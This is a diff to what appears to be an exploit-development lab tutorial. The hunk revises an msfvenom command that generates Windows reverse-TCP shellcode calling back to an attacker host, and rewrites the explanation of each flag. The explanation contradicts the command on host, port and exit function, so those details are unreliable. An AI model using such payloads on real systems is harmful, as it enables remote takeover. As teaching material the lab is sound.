@@ -349,16 +349,23 @@ Now that we have all the necessary parts for the creation of an exploit, we will
 ### Exploitation
 1. Now We will need to create a reverse shell we can include in the payload, this is a program that reaches out and makes a connection to the attacker's machine (or one they control) from target machine and provides a shell to the attacker. We can generate the shellcode with the following command. 
 	```
-	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=seh -f python -v SHELL -b '\x00'
+	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=seh -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
       * `msfvenom`: [Metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) payload encoder and generator.
-      * `-p windows/shell_reverse_tcp`: Specify we are using the tcp reverse shell payload for Windows. 
-	  * `LHOST=10.0.2.15`: Specify the Listening Host's IP (IP of Attacker).
-      * `LPORT=4444`: Specify the Listening port (Port Attacker Listens on).
-      * `EXITFUNC=thread`: Exit process, this is running as a seh-based exploit.
-      * `-f python`: Format the output for use in a python program.
-      * `-v SHELL`: Specify SHELL as the variable name.
-      * `-b '\x00'`: Set bad characters.
+	  * `-p `: Payload we are generating shellcode for.
+    	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
+    	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
+    	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
+    	* `EXITFUNC=thread`: Create a thread to run the payload.
+	  * `-f`: The output format. 
+      	* `python`: Format for use in python scripts.
+  	  * `-v`: Specify a custom variable name.
+    	* `SHELL`: Shell Variable name.
+      * `-a x86`: Specify the target architecture as `x86`
+	  * `--platform windows`: Specify the target platform as Windows
+  	  * `-b`: Specifies bad chars and byte values. This is given in the byte values. 
+        * `\x00\x0a\x0d`: Null char, carriage return, and newline. 
+
 
 2. Create the byte array representing the shellcode as done in [exploit6.py](./SourceCode/exploit6.py). Remember this should be placed at the start of the buffer!
 3. Now, let's see how the program reacts!
